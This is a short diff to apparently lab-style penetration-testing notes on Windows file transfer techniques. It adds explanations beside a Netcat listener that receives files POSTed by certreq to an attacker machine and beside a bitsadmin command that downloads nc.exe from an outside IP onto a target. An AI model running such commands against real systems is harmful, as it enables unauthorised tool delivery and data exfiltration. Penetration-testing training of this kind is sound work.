@@ -31,6 +31,7 @@ Normally used for certificate requests, but can POST file contents to an attacke
 ```bash
 sudo nc -lvnp 8000
 ```
+> Starts a Netcat listener on port 8000 to catch the file POSTed by certreq; change 8000 if the port is in use.
 
 **Target — Upload a File:**
 
@@ -70,6 +71,7 @@ BITS (Background Intelligent Transfer Service) downloads files while being "poli
 ```cmd
 bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
 ```
+> Uses the Windows BITS service to download a file to the target; swap the URL and the destination path.
 
 **PowerShell BITS Module:**
 
